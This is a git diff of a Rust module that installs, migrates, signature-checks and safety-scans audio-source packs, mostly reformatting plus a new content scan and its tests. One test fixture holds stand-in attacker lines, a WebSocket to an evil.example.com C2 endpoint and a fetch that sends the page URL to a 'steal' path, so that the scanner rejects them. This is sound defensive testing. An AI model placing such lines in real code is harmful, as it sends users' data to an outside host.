@@ -147,7 +147,10 @@ pub struct SourceBundleState {
 
 impl SourceBundleState {
     fn new_v3() -> Self {
-        Self { schema: STATE_SCHEMA, ..Default::default() }
+        Self {
+            schema: STATE_SCHEMA,
+            ..Default::default()
+        }
     }
 
     fn pack(&self, id: &str) -> Option<&SourcePackMeta> {
@@ -231,13 +234,16 @@ pub(crate) fn save_state(dir: &Path, state: &SourceBundleState) -> Result<(), St
 /// bad[] → play-official 的 skipCodes；previousOfficial 弃用（其目录在 v2
 /// 安装新版时已被删除，无从恢复）；custom 包保持 id/目录。
 fn migrate_v2(dir: &Path, raw: Value) -> SourceBundleState {
-    let v2: SourceBundleStateV2 =
-        serde_json::from_value(raw).unwrap_or_default();
+    let v2: SourceBundleStateV2 = serde_json::from_value(raw).unwrap_or_default();
     let mut state = SourceBundleState::new_v3();
     state.last_check_at = v2.last_check_at;
     let install = dir.join("install");
     for pack in v2.packs {
-        let id = if pack.id == "official" { OFFICIAL_PLAY_ID.to_string() } else { pack.id };
+        let id = if pack.id == "official" {
+            OFFICIAL_PLAY_ID.to_string()
+        } else {
+            pack.id
+        };
         if !valid_pack_id(&id) || state.pack(&id).is_some() {
             continue;
         }
@@ -253,10 +259,18 @@ fn migrate_v2(dir: &Path, raw: Value) -> SourceBundleState {
                 }
             }
         }
-        let skip_codes = if id == OFFICIAL_PLAY_ID { v2.bad.clone() } else { Vec::new() };
+        let skip_codes = if id == OFFICIAL_PLAY_ID {
+            v2.bad.clone()
+        } else {
+            Vec::new()
+        };
         state.packs.push(SourcePackMeta {
             name: if pack.name.trim().is_empty() {
-                if pack.source == "official" { "官方播放包".into() } else { "自定义播放包".into() }
+                if pack.source == "official" {
+                    "官方播放包".into()
+                } else {
+                    "自定义播放包".into()
+                }
             } else {
                 pack.name
             },
@@ -290,7 +304,13 @@ fn migrate_v2(dir: &Path, raw: Value) -> SourceBundleState {
     }
     state.active_id = v2
         .active_id
-        .map(|a| if a == "official" { OFFICIAL_PLAY_ID.to_string() } else { a })
+        .map(|a| {
+            if a == "official" {
+                OFFICIAL_PLAY_ID.to_string()
+            } else {
+                a
+            }
+        })
         .filter(|a| state.pack(a).is_some());
     if let Err(e) = save_state(dir, &state) {
         log::warn!("[source-bundle] v2→v3 迁移落盘失败: {e}");
@@ -308,7 +328,10 @@ fn migrate_v1(dir: &Path, raw: Value) -> SourceBundleState {
     let install = dir.join("install");
     if install.exists() {
         let _ = std::fs::remove_dir_all(&install);
-        log::info!("[source-bundle] v1→v3 迁移：清空不兼容的旧音源包目录 {}", install.display());
+        log::info!(
+            "[source-bundle] v1→v3 迁移：清空不兼容的旧音源包目录 {}",
+            install.display()
+        );
     }
     state
 }
@@ -356,10 +379,7 @@ fn validate_on_disk(dir: &Path, state: &mut SourceBundleState) {
     let install = dir.join("install");
     let mut lost: Vec<String> = Vec::new();
     state.packs.retain(|p| {
-        let ok = install
-            .join(&p.dir)
-            .join(p.artifact())
-            .is_file();
+        let ok = install.join(&p.dir).join(p.artifact()).is_file();
         if !ok {
             lost.push(p.id.clone());
         }
@@ -529,9 +549,10 @@ fn validate_pack_text(dir: &Path, text: &str) -> Result<PackHeader, String> {
     // 官方 id 签名硬校验：官方包同样走直链/本地分发，身份靠签名而非渠道——
     // 验不过（含无签名块）一律拒绝，冒充/篡改的包进不了官方槽；第三方 id 不受影响。
     // 对所有渠道生效（直链/本地/manifest/自管更新），是安装管线的最终闸门。
-    if header.id == OFFICIAL_META_ID || header.id == OFFICIAL_PLAY_ID {
+    let is_official = header.id == OFFICIAL_META_ID || header.id == OFFICIAL_PLAY_ID;
+    if is_official {
         #[cfg(test)]
-        if tests::BYPASS_SIGNATURE_GATE.load(std::sync::atomic::Ordering::SeqCst) {
+        if tests::BYPASS_SIGNATURE_GATE.load(std::sync::atomic::Ordering::SeqCst) > 0 {
             // 测试旁路：模拟签名落地前的历史安装路径（仅测试二进制存在，见 tests 模块）
         } else {
             crate::pack_signature::verify_official_signature(text)
@@ -541,12 +562,21 @@ fn validate_pack_text(dir: &Path, text: &str) -> Result<PackHeader, String> {
         crate::pack_signature::verify_official_signature(text)
             .map_err(|e| format!("官方包签名校验失败：{e}"))?;
     }
+    // 内容安全扫描（扫描对象 = 剥掉签名块的正文）：签名只证明来源，不证明内容
+    // 无害——第三方包任何命中即拒；官方包已验签（来源可信），命中只记日志。
+    // 规则与 qt-uniappx services/pack-safety.uts 逐条一致。
+    let body_for_scan = crate::pack_signature::split_sign_block(text).0;
+    crate::pack_safety::scan_pack_text(body_for_scan, is_official)?;
     if let Some(old) = load_state(dir).pack(&header.id) {
         if old.kind != header.kind {
             return Err(format!(
                 "包 id 冲突：{} 已被{}音源包占用，请先卸载",
                 header.id,
-                if old.kind == PACK_KIND_META { "数据" } else { "播放" }
+                if old.kind == PACK_KIND_META {
+                    "数据"
+                } else {
+                    "播放"
+                }
             ));
         }
     }
@@ -609,7 +639,11 @@ fn install_pack_at(
             id: header.id.clone(),
             kind: header.kind.clone(),
             name: if header.name.trim().is_empty() {
-                if header.kind == PACK_KIND_META { "数据包".into() } else { "播放包".into() }
+                if header.kind == PACK_KIND_META {
+                    "数据包".into()
+                } else {
+                    "播放包".into()
+                }
             } else {
                 header.name.clone()
             },
@@ -623,7 +657,10 @@ fn install_pack_at(
             dir: header.id.clone(),
             installed_at: old_pack.as_ref().map(|p| p.installed_at).unwrap_or(now),
             updated_at: now,
-            skip_codes: old_pack.as_ref().map(|p| p.skip_codes.clone()).unwrap_or_default(),
+            skip_codes: old_pack
+                .as_ref()
+                .map(|p| p.skip_codes.clone())
+                .unwrap_or_default(),
             last_probe_at: old_pack.as_ref().map(|p| p.last_probe_at).unwrap_or(0),
             install_source,
             install_ref,
@@ -635,11 +672,7 @@ fn install_pack_at(
         state.pack_mut_or_push(pack.clone());
         // 生效门：槽位空着或本来就生效的是它 → 自动上位；否则不打扰用户选择
         if header.kind == PACK_KIND_PLAY {
-            if state
-                .active_id
-                .as_deref()
-                .map_or(true, |a| a == header.id)
-            {
+            if state.active_id.as_deref().map_or(true, |a| a == header.id) {
                 state.active_id = Some(header.id.clone());
             }
         } else if state
@@ -725,13 +758,18 @@ fn rollback_update_at(dir: &Path, pack_id: &str) -> (bool, bool) {
             state.active_meta_id = None;
         }
     } else {
-        state.active_id = pending.prev_active.filter(|a| a != pack_id || state.pack(pack_id).is_some());
+        state.active_id = pending
+            .prev_active
+            .filter(|a| a != pack_id || state.pack(pack_id).is_some());
         if state.active_id.as_deref() == Some(pack_id) && state.pack(pack_id).is_none() {
             state.active_id = None;
         }
     }
     let _ = save_state(dir, &state);
-    (pending.prev_pack.is_some(), bad_code > 0 && pending.prev_pack.is_some())
+    (
+        pending.prev_pack.is_some(),
+        bad_code > 0 && pending.prev_pack.is_some(),
+    )
 }
 
 fn broadcast_packs_changed(app: &AppHandle) {
@@ -812,7 +850,10 @@ fn stage_pack_text(
     let dir = source_bundle::bundle_dir(app);
     let header = validate_pack_text(&dir, text)?;
     let signature_verified = header.id == OFFICIAL_META_ID || header.id == OFFICIAL_PLAY_ID;
-    let installed_code = load_state(&dir).pack(&header.id).map(|p| p.version_code).unwrap_or(0);
+    let installed_code = load_state(&dir)
+        .pack(&header.id)
+        .map(|p| p.version_code)
+        .unwrap_or(0);
     let token = put_staged(StagedInstall {
         channel: channel.to_string(),
         reference: reference.to_string(),
@@ -831,7 +872,6 @@ fn stage_pack_text(
         installed_code,
     })
 }
-
 
 fn broadcast_meta_changed(app: &AppHandle) {
     let _ = app.emit("source-meta-changed", ());
@@ -1320,10 +1360,16 @@ pub async fn cmd_source_apply_update(
             return Err(e);
         }
     };
-    let old_version = load_state(&dir).pack(&offer.target_id).map(|p| p.version_code);
+    let old_version = load_state(&dir)
+        .pack(&offer.target_id)
+        .map(|p| p.version_code);
     // 官方 manifest 通道更新 → 安装来源改写为 manifest；自管通道（包自身
     // updateUrl / 基线）保留原安装来源（install_pack_at 内处理）
-    let channel = if offer.channel == "manifest" { INSTALL_SOURCE_MANIFEST } else { "" };
+    let channel = if offer.channel == "manifest" {
+        INSTALL_SOURCE_MANIFEST
+    } else {
+        ""
+    };
     let outcome = install_pack_at(&dir, &text, true, channel, "");
     match outcome {
         Ok(outcome) => {
@@ -1358,7 +1404,10 @@ async fn download_update_text(offer: &PackUpdateOffer) -> Result<String, String>
     let text = download_pack_text(offer.url.trim()).await?;
     let header = parse_pack_header(&text)
         .ok_or_else(|| "远端文件不是音源包（首行缺少 __QT_PACK__ 包头）".to_string())?;
-    if header.id != offer.target_id || header.kind != offer.kind || header.version_code != offer.new_code {
+    if header.id != offer.target_id
+        || header.kind != offer.kind
+        || header.version_code != offer.new_code
+    {
         return Err(format!(
             "远端文件与更新信息不一致（{}/{}/v{}），已取消",
             header.id, header.kind, header.version_code
@@ -1383,10 +1432,7 @@ fn mark_pack_bad_at(dir: &Path, pack_id: &str, code: i64) {
 
 /// 从 https 直链安装（用户粘贴 play-bundle.js / meta-bundle.js 直链）
 #[tauri::command(rename = "source_install_from_url")]
-pub async fn cmd_source_install_from_url(
-    app: AppHandle,
-    url: String,
-) -> Result<Value, String> {
+pub async fn cmd_source_install_from_url(app: AppHandle, url: String) -> Result<Value, String> {
     let url = url.trim().to_string();
     if url.is_empty() {
         return Err("链接不能为空".to_string());
@@ -1409,10 +1455,7 @@ pub async fn cmd_source_install_from_url(
 
 /// 从包文本安装（诊断/导入用；与直链同一条管线，来源记为未知）
 #[tauri::command(rename = "source_install_from_text")]
-pub async fn cmd_source_install_from_text(
-    app: AppHandle,
-    text: String,
-) -> Result<Value, String> {
+pub async fn cmd_source_install_from_text(app: AppHandle, text: String) -> Result<Value, String> {
     let dir = source_bundle::bundle_dir(&app);
     let outcome = install_pack_at(&dir, &text, false, "", "")?;
     broadcast_if_activated(&app, &outcome);
@@ -1533,7 +1576,13 @@ pub async fn cmd_source_install_staged(app: AppHandle, token: String) -> Result<
         return Err("预览已过期或已安装过，请重新获取包信息".to_string());
     };
     let dir = source_bundle::bundle_dir(&app);
-    let outcome = install_pack_at(&dir, &staged.text, false, &staged.channel, &staged.reference)?;
+    let outcome = install_pack_at(
+        &dir,
+        &staged.text,
+        false,
+        &staged.channel,
+        &staged.reference,
+    )?;
     broadcast_if_activated(&app, &outcome);
     log::info!(
         "[source-bundle] 预览确认安装 {} {} v{}（渠道 {}）",
@@ -1678,7 +1727,11 @@ pub async fn cmd_source_meta_loaded(
     }
     log::info!(
         "[source-bundle] meta 槽已装载：{} v{}",
-        if pack_id.is_empty() { "内置基线" } else { &pack_id },
+        if pack_id.is_empty() {
+            "内置基线"
+        } else {
+            &pack_id
+        },
         code.unwrap_or(0)
     );
     Ok(json!({ "loaded": true }))
@@ -1715,7 +1768,11 @@ pub async fn cmd_source_pack_load_failed(
         };
         report_to_backend(&app, pack.version_code, result.to_string(), error.clone()).await;
     }
-    log::warn!("[source-bundle] 播放包装载失败（{} v{}）: {error}", pack.id, pack.version_code);
+    log::warn!(
+        "[source-bundle] 播放包装载失败（{} v{}）: {error}",
+        pack.id,
+        pack.version_code
+    );
 
     let is_update = pending.as_ref().map(|p| p.is_update) == Some(true);
     if is_update {
@@ -1834,22 +1891,34 @@ mod tests {
     /// 官方 id 签名闸门旁路（仅测试二进制存在，生产编译无此符号）：
     /// 需要安装「无签名官方 id 包」的旧测试用它模拟签名落地前（2026-10 之前）
     /// 的历史安装路径；闸门本身的验证见 official_pack_gate_* 测试。
-    pub(super) static BYPASS_SIGNATURE_GATE: std::sync::atomic::AtomicBool =
-        std::sync::atomic::AtomicBool::new(false);
+    pub(super) static BYPASS_SIGNATURE_GATE: std::sync::atomic::AtomicUsize =
+        std::sync::atomic::AtomicUsize::new(0);
 
-    /// RAII 旁路：作用域内放行无签名官方包，离开作用域自动恢复硬校验
-    struct SignatureGateBypass;
+    /// 签名闸门互斥锁：旁路类（BYPASS_SIGNATURE_GATE 计数 >0 期间）与
+    /// 「必须拒绝」断言类测试互斥——cargo test 并发下，二者交错会让
+    /// reject 测试恰好撞上别人的旁路窗口而随机失败。
+    static GATE_TEST_LOCK: std::sync::Mutex<()> = std::sync::Mutex::new(());
+
+    /// RAII 旁路：作用域内放行无签名官方包，离开作用域自动恢复硬校验。
+    /// 计数而非布尔：cargo test 多线程并发下，多个旁路测试交错时，
+    /// 任何一个 drop 都不能把别人的旁路关掉（布尔版曾致随机失败）。
+    /// 同时持有 GATE_TEST_LOCK，与 reject 断言类测试互斥。drop 顺序保证
+    /// 「先计数归零、后放锁」（impl Drop::drop 先于字段释放）。
+    struct SignatureGateBypass {
+        _lock: std::sync::MutexGuard<'static, ()>,
+    }
 
     impl SignatureGateBypass {
         fn new() -> Self {
-            BYPASS_SIGNATURE_GATE.store(true, std::sync::atomic::Ordering::SeqCst);
-            Self
+            let _lock = GATE_TEST_LOCK.lock().unwrap_or_else(|e| e.into_inner());
+            BYPASS_SIGNATURE_GATE.fetch_add(1, std::sync::atomic::Ordering::SeqCst);
+            Self { _lock }
         }
     }
 
     impl Drop for SignatureGateBypass {
         fn drop(&mut self) {
-            BYPASS_SIGNATURE_GATE.store(false, std::sync::atomic::Ordering::SeqCst);
+            BYPASS_SIGNATURE_GATE.fetch_sub(1, std::sync::atomic::Ordering::SeqCst);
         }
     }
 
@@ -1876,7 +1945,8 @@ mod tests {
 // xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
 // xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
 // __qtPlayPackFactory stub for gate test
-"#;    const SIGNED_OFFICIAL_SIG_B64: &str =
+"#;
+    const SIGNED_OFFICIAL_SIG_B64: &str =
         "lPtmJNM2R349y+OMrTbjg0AQq9vNCM01ow8ec/Ud9Xf4rsVQcAa6xirEG4r6VSSpSo4MKHdbeIPnccLJJNbZBA==";
 
     fn signed_official_pack() -> String {
@@ -1887,6 +1957,7 @@ mod tests {
 
     #[test]
     fn official_pack_gate_rejects_unsigned() {
+        let _lock = GATE_TEST_LOCK.lock().unwrap_or_else(|e| e.into_inner());
         let dir = tmp_dir("gate-uns");
         // 无签名块的官方 id 包：直链/本地渠道最常见的冒充形态
         let err = install_pack_at(
@@ -1900,12 +1971,15 @@ mod tests {
         assert!(err.contains("官方包签名校验失败"), "{err}");
         assert!(err.contains("缺少官方签名"), "{err}");
         // 也没有落盘
-        assert!(!install_dir(&dir, OFFICIAL_PLAY_ID).join(ARTIFACT_PLAY).is_file());
+        assert!(!install_dir(&dir, OFFICIAL_PLAY_ID)
+            .join(ARTIFACT_PLAY)
+            .is_file());
         let _ = std::fs::remove_dir_all(&dir);
     }
 
     #[test]
     fn official_pack_gate_rejects_forged_signature() {
+        let _lock = GATE_TEST_LOCK.lock().unwrap_or_else(|e| e.into_inner());
         let dir = tmp_dir("gate-fge");
         // 有签名块但对不上内容（把别处签的名搬过来/改过正文）
         let mut text = pack_text(PACK_KIND_PLAY, OFFICIAL_PLAY_ID, 1, true);
@@ -1920,8 +1994,14 @@ mod tests {
     #[test]
     fn official_pack_gate_accepts_release_signed_vector() {
         let dir = tmp_dir("gate-ok");
-        install_pack_at(&dir, &signed_official_pack(), false, INSTALL_SOURCE_URL, "https://example.com/play-bundle.js")
-            .expect("发布签名的官方向量必须能装");
+        install_pack_at(
+            &dir,
+            &signed_official_pack(),
+            false,
+            INSTALL_SOURCE_URL,
+            "https://example.com/play-bundle.js",
+        )
+        .expect("发布签名的官方向量必须能装");
         take_pending(OFFICIAL_PLAY_ID);
         let st = load_state(&dir);
         let p = st.pack(OFFICIAL_PLAY_ID).unwrap();
@@ -1929,8 +2009,12 @@ mod tests {
         assert_eq!(p.version_code, 2026100201);
         assert_eq!(p.install_source, "url");
         // 落盘文本与源一致（含尾部签块，装载引擎按注释忽略）
-        let on_disk =
-            std::fs::read_to_string(dir.join("install").join(OFFICIAL_PLAY_ID).join(ARTIFACT_PLAY)).unwrap();
+        let on_disk = std::fs::read_to_string(
+            dir.join("install")
+                .join(OFFICIAL_PLAY_ID)
+                .join(ARTIFACT_PLAY),
+        )
+        .unwrap();
         assert!(on_disk.ends_with("*/\n"), "落盘保留尾部签名块");
         let _ = std::fs::remove_dir_all(&dir);
     }
@@ -1939,11 +2023,48 @@ mod tests {
     fn third_party_pack_needs_no_signature() {
         let dir = tmp_dir("gate-3rd");
         // 第三方包不签名照常安装（闸门只管官方保留 id）
-        install_pack_at(&dir, &pack_text(PACK_KIND_PLAY, "play-custom", 1, true), false, INSTALL_SOURCE_URL, "https://e/x.js")
-            .expect("第三方无签名包必须能装");
+        install_pack_at(
+            &dir,
+            &pack_text(PACK_KIND_PLAY, "play-custom", 1, true),
+            false,
+            INSTALL_SOURCE_URL,
+            "https://e/x.js",
+        )
+        .expect("第三方无签名包必须能装");
         take_pending("play-custom");
         let st = load_state(&dir);
         assert!(!st.pack("play-custom").unwrap().sign_verified);
+        let _ = std::fs::remove_dir_all(&dir);
+    }
+
+    #[test]
+    fn unsafe_third_party_pack_is_rejected_by_scan() {
+        let dir = tmp_dir("safety-3rd");
+        // 危险特征混进凑体积的正文里：安装管线（validate_pack_text）直接拒绝
+        let mut text = pack_text(PACK_KIND_PLAY, "evil-pack", 1, true);
+        text.push_str("const ws = new WebSocket('wss://evil.example.com/c2');\n");
+        text.push_str("await fetch('https://evil.example.com/steal?d=' + location.href);\n");
+        let err =
+            install_pack_at(&dir, &text, false, INSTALL_SOURCE_URL, "https://e/x.js").unwrap_err();
+        assert!(err.contains("不安全代码特征"), "{err}");
+        assert!(err.contains("WebSocket"), "{err}");
+        assert!(err.contains("fetch("), "{err}");
+        assert!(
+            !install_dir(&dir, "evil-pack").join(ARTIFACT_PLAY).is_file(),
+            "危险包不落盘"
+        );
+        let _ = std::fs::remove_dir_all(&dir);
+    }
+
+    #[test]
+    fn official_pack_scan_hits_do_not_block() {
+        let dir = tmp_dir("safety-off");
+        let _g = SignatureGateBypass::new();
+        // 官方 id（签名上游已验）即使命中扫描规则也放行：良性字样
+        // （如请求头里的 'XMLHttpRequest' 字符串）不该挡自家包
+        let mut text = pack_text(PACK_KIND_PLAY, OFFICIAL_PLAY_ID, 1, true);
+        text.push_str("headers['X-Requested-With'] = 'XMLHttpRequest';\n");
+        validate_pack_text(&dir, &text).expect("官方包扫描命中不阻断（签名即背书）");
         let _ = std::fs::remove_dir_all(&dir);
     }
 
@@ -1989,8 +2110,14 @@ mod tests {
         assert_eq!(back.last_check_at, 42);
         // 新字段以 camelCase 落盘（与前端 SourcePackVo 同名键）
         let raw = std::fs::read_to_string(state_path(&dir)).unwrap();
-        assert!(raw.contains("\"installSource\": \"url\""), "installSource camelCase: {raw}");
-        assert!(raw.contains("\"lastErrorAt\": 1758000000012"), "lastErrorAt camelCase");
+        assert!(
+            raw.contains("\"installSource\": \"url\""),
+            "installSource camelCase: {raw}"
+        );
+        assert!(
+            raw.contains("\"lastErrorAt\": 1758000000012"),
+            "lastErrorAt camelCase"
+        );
         let _ = std::fs::remove_dir_all(&dir);
     }
 
@@ -1999,10 +2126,18 @@ mod tests {
         let dir = tmp_dir("v2m");
         let old_play = dir.join("install").join("2026100101");
         std::fs::create_dir_all(&old_play).unwrap();
-        std::fs::write(old_play.join(ARTIFACT_PLAY), pack_text(PACK_KIND_PLAY, "official", 2026100101, true)).unwrap();
+        std::fs::write(
+            old_play.join(ARTIFACT_PLAY),
+            pack_text(PACK_KIND_PLAY, "official", 2026100101, true),
+        )
+        .unwrap();
         let custom = dir.join("install").join("custom-20261001-120000");
         std::fs::create_dir_all(&custom).unwrap();
-        std::fs::write(custom.join(ARTIFACT_PLAY), pack_text(PACK_KIND_PLAY, "custom-20261001-120000", 0, true)).unwrap();
+        std::fs::write(
+            custom.join(ARTIFACT_PLAY),
+            pack_text(PACK_KIND_PLAY, "custom-20261001-120000", 0, true),
+        )
+        .unwrap();
         let v2 = r#"{
             "schema": 2,
             "packs": [
@@ -2023,17 +2158,34 @@ mod tests {
         let official = st.pack(OFFICIAL_PLAY_ID).unwrap();
         assert_eq!(official.kind, PACK_KIND_PLAY);
         assert_eq!(official.version_code, 2026100101);
-        assert_eq!(official.skip_codes, vec![2026091701], "bad[] → play-official skipCodes");
+        assert_eq!(
+            official.skip_codes,
+            vec![2026091701],
+            "bad[] → play-official skipCodes"
+        );
         assert_eq!(official.dir, OFFICIAL_PLAY_ID, "目录改名到 id");
-        assert_eq!(official.install_source, "manifest", "v2 official → manifest 渠道");
+        assert_eq!(
+            official.install_source, "manifest",
+            "v2 official → manifest 渠道"
+        );
         assert_eq!(
             st.pack("custom-20261001-120000").unwrap().install_source,
             "",
             "v2 custom → 来源未知"
         );
-        assert!(dir.join("install").join(OFFICIAL_PLAY_ID).join(ARTIFACT_PLAY).is_file(), "产物随目录改名");
+        assert!(
+            dir.join("install")
+                .join(OFFICIAL_PLAY_ID)
+                .join(ARTIFACT_PLAY)
+                .is_file(),
+            "产物随目录改名"
+        );
         assert!(!dir.join("install").join("2026100101").exists());
-        assert_eq!(st.active_id.as_deref(), Some(OFFICIAL_PLAY_ID), "official → play-official");
+        assert_eq!(
+            st.active_id.as_deref(),
+            Some(OFFICIAL_PLAY_ID),
+            "official → play-official"
+        );
         assert_eq!(st.last_check_at, 1758000000);
         // 自定义包保持
         assert!(st.pack("custom-20261001-120000").is_some());
@@ -2045,7 +2197,9 @@ mod tests {
         let dir = tmp_dir("v1m");
         std::fs::create_dir_all(dir.join("install").join("2026091801")).unwrap();
         std::fs::write(
-            dir.join("install").join("2026091801").join("source-bundle.js"),
+            dir.join("install")
+                .join("2026091801")
+                .join("source-bundle.js"),
             b"export const x = 1;",
         )
         .unwrap();
@@ -2072,10 +2226,19 @@ mod tests {
         let dir = tmp_dir("install1");
         // 旁路签名闸门：本测试关注空槽上位语义（闸门验证见 official_pack_gate_*）
         let _gate = SignatureGateBypass::new();
-        let outcome = install_pack_at(&dir, &pack_text(PACK_KIND_PLAY, "play-official", 1, true), false, "", "").unwrap();
+        let outcome = install_pack_at(
+            &dir,
+            &pack_text(PACK_KIND_PLAY, "play-official", 1, true),
+            false,
+            "",
+            "",
+        )
+        .unwrap();
         assert!(outcome.activated, "空槽自动上位");
         assert!(!outcome.replaced);
-        assert!(install_dir(&dir, "play-official").join(ARTIFACT_PLAY).is_file());
+        assert!(install_dir(&dir, "play-official")
+            .join(ARTIFACT_PLAY)
+            .is_file());
         assert!(pending_map().lock().unwrap().contains_key("play-official"));
         // 产物在 → 不被落盘校验剔除
         let st = load_state(&dir);
@@ -2087,9 +2250,23 @@ mod tests {
     #[test]
     fn install_does_not_steal_occupied_slot() {
         let dir = tmp_dir("install2");
-        install_pack_at(&dir, &pack_text(PACK_KIND_PLAY, "play-a", 1, true), false, "", "").unwrap();
+        install_pack_at(
+            &dir,
+            &pack_text(PACK_KIND_PLAY, "play-a", 1, true),
+            false,
+            "",
+            "",
+        )
+        .unwrap();
         take_pending("play-a");
-        let outcome = install_pack_at(&dir, &pack_text(PACK_KIND_PLAY, "play-b", 1, true), false, "", "").unwrap();
+        let outcome = install_pack_at(
+            &dir,
+            &pack_text(PACK_KIND_PLAY, "play-b", 1, true),
+            false,
+            "",
+            "",
+        )
+        .unwrap();
         assert!(!outcome.activated, "不抢生效位");
         let st = load_state(&dir);
         assert_eq!(st.active_id.as_deref(), Some("play-a"));
@@ -2101,25 +2278,49 @@ mod tests {
     #[test]
     fn same_id_update_backs_up_prev_and_keeps_installed_at() {
         let dir = tmp_dir("install3");
-        install_pack_at(&dir, &pack_text(PACK_KIND_PLAY, "play-x", 5, true), false, INSTALL_SOURCE_URL, "https://example.com/play-x.js").unwrap();
+        install_pack_at(
+            &dir,
+            &pack_text(PACK_KIND_PLAY, "play-x", 5, true),
+            false,
+            INSTALL_SOURCE_URL,
+            "https://example.com/play-x.js",
+        )
+        .unwrap();
         take_pending("play-x");
         std::thread::sleep(std::time::Duration::from_millis(1100));
-        let outcome = install_pack_at(&dir, &pack_text(PACK_KIND_PLAY, "play-x", 9, true), true, "", "").unwrap();
+        let outcome = install_pack_at(
+            &dir,
+            &pack_text(PACK_KIND_PLAY, "play-x", 9, true),
+            true,
+            "",
+            "",
+        )
+        .unwrap();
         assert!(outcome.replaced);
         assert!(outcome.activated);
         let target = install_dir(&dir, "play-x");
-        assert!(target.join(format!("{ARTIFACT_PLAY}{PREV_SUFFIX}")).is_file(), ".prev 备份存在");
+        assert!(
+            target
+                .join(format!("{ARTIFACT_PLAY}{PREV_SUFFIX}"))
+                .is_file(),
+            ".prev 备份存在"
+        );
         let st = load_state(&dir);
         let p = st.pack("play-x").unwrap();
         assert_eq!(p.version_code, 9);
-        assert!(p.updated_at > p.installed_at, "installedAt 保留、updatedAt 前进");
+        assert!(
+            p.updated_at > p.installed_at,
+            "installedAt 保留、updatedAt 前进"
+        );
         // 回滚：还原旧版本 + 拉黑 v9
         let (reverted, blacklisted) = rollback_update_at(&dir, "play-x");
         assert!(reverted && blacklisted);
         let st = load_state(&dir);
         assert_eq!(st.pack("play-x").unwrap().version_code, 5);
         assert!(st.pack("play-x").unwrap().skip_codes.contains(&9));
-        assert!(!target.join(format!("{ARTIFACT_PLAY}{PREV_SUFFIX}")).exists());
+        assert!(!target
+            .join(format!("{ARTIFACT_PLAY}{PREV_SUFFIX}"))
+            .exists());
         let _ = std::fs::remove_dir_all(&dir);
     }
 
@@ -2131,8 +2332,18 @@ mod tests {
         let target = install_dir(&dir, "play-official");
         std::fs::create_dir_all(&target).unwrap();
         std::fs::write(target.join("chain.json"), b"{}").unwrap();
-        install_pack_at(&dir, &pack_text(PACK_KIND_PLAY, "play-official", 1, true), false, "", "").unwrap();
-        assert!(!target.join("chain.json").exists(), "播放包安装清掉残留 chain.json");
+        install_pack_at(
+            &dir,
+            &pack_text(PACK_KIND_PLAY, "play-official", 1, true),
+            false,
+            "",
+            "",
+        )
+        .unwrap();
+        assert!(
+            !target.join("chain.json").exists(),
+            "播放包安装清掉残留 chain.json"
+        );
         let _ = take_pending("play-official");
         let _ = std::fs::remove_dir_all(&dir);
     }
@@ -2140,9 +2351,23 @@ mod tests {
     #[test]
     fn id_conflict_across_kinds_rejected() {
         let dir = tmp_dir("install5");
-        install_pack_at(&dir, &pack_text(PACK_KIND_META, "shared-id", 1, false), false, "", "").unwrap();
+        install_pack_at(
+            &dir,
+            &pack_text(PACK_KIND_META, "shared-id", 1, false),
+            false,
+            "",
+            "",
+        )
+        .unwrap();
         take_pending("shared-id");
-        let err = install_pack_at(&dir, &pack_text(PACK_KIND_PLAY, "shared-id", 2, true), false, "", "").unwrap_err();
+        let err = install_pack_at(
+            &dir,
+            &pack_text(PACK_KIND_PLAY, "shared-id", 2, true),
+            false,
+            "",
+            "",
+        )
+        .unwrap_err();
         assert!(err.contains("包 id 冲突"), "跨 kind 同 id 拒绝: {err}");
         let st = load_state(&dir);
         assert_eq!(st.pack("shared-id").unwrap().kind, PACK_KIND_META);
@@ -2152,18 +2377,38 @@ mod tests {
     #[test]
     fn invalid_pack_text_rejected() {
         let dir = tmp_dir("install6");
-        assert!(install_pack_at(&dir, "var x = 1;\n", false, "", "").is_err(), "无包头");
+        assert!(
+            install_pack_at(&dir, "var x = 1;\n", false, "", "").is_err(),
+            "无包头"
+        );
         let no_marker = pack_text(PACK_KIND_PLAY, "play-y", 1, false);
         let err = install_pack_at(&dir, &no_marker, false, "", "").unwrap_err();
-        assert!(err.contains("__qtPlayPackFactory"), "播放包缺装配入口: {err}");
+        assert!(
+            err.contains("__qtPlayPackFactory"),
+            "播放包缺装配入口: {err}"
+        );
         let _ = std::fs::remove_dir_all(&dir);
     }
 
     #[test]
     fn uninstall_clears_active_slot_without_succ() {
         let dir = tmp_dir("install7");
-        install_pack_at(&dir, &pack_text(PACK_KIND_PLAY, "play-a", 1, true), false, "", "").unwrap();
-        install_pack_at(&dir, &pack_text(PACK_KIND_PLAY, "play-b", 1, true), false, "", "").unwrap();
+        install_pack_at(
+            &dir,
+            &pack_text(PACK_KIND_PLAY, "play-a", 1, true),
+            false,
+            "",
+            "",
+        )
+        .unwrap();
+        install_pack_at(
+            &dir,
+            &pack_text(PACK_KIND_PLAY, "play-b", 1, true),
+            false,
+            "",
+            "",
+        )
+        .unwrap();
         clear_pending("play-a");
         clear_pending("play-b");
         let mut st = load_state(&dir);
@@ -2217,28 +2462,56 @@ mod tests {
         let dir = tmp_dir("src-ch");
         let url = "https://example.com/play-x.js";
         // 首装（直链）：url + URL
-        install_pack_at(&dir, &pack_text(PACK_KIND_PLAY, "play-x", 1, true), false, INSTALL_SOURCE_URL, url).unwrap();
+        install_pack_at(
+            &dir,
+            &pack_text(PACK_KIND_PLAY, "play-x", 1, true),
+            false,
+            INSTALL_SOURCE_URL,
+            url,
+        )
+        .unwrap();
         take_pending("play-x");
         let st = load_state(&dir);
         let p = st.pack("play-x").unwrap();
         assert_eq!(p.install_source, "url");
         assert_eq!(p.install_ref, url);
         // 自管更新（包自身 updateUrl 通道）：保留原安装来源
-        install_pack_at(&dir, &pack_text(PACK_KIND_PLAY, "play-x", 2, true), true, "", "").unwrap();
+        install_pack_at(
+            &dir,
+            &pack_text(PACK_KIND_PLAY, "play-x", 2, true),
+            true,
+            "",
+            "",
+        )
+        .unwrap();
         take_pending("play-x");
         let st = load_state(&dir);
         let p = st.pack("play-x").unwrap();
         assert_eq!(p.install_source, "url", "自管更新保留原来源");
         assert_eq!(p.install_ref, url);
         // 官方 manifest 通道更新：改写为 manifest + 空 ref
-        install_pack_at(&dir, &pack_text(PACK_KIND_PLAY, "play-x", 3, true), true, INSTALL_SOURCE_MANIFEST, "").unwrap();
+        install_pack_at(
